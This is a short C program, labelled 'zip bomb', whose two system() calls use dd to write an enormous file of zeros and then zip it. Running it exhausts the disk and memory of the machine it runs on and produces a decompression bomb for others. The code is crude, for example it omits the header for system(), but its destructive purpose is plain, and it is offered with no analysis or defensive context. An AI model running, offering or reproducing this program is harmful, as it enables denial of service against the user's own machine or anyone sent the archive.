#include <stdio.h>

int main() {
    printf("zip bomb");
    system("dd if=/dev/zero of=data bs=10G count=10000");
    system("zip -r data.zip data");
    return 0;
}
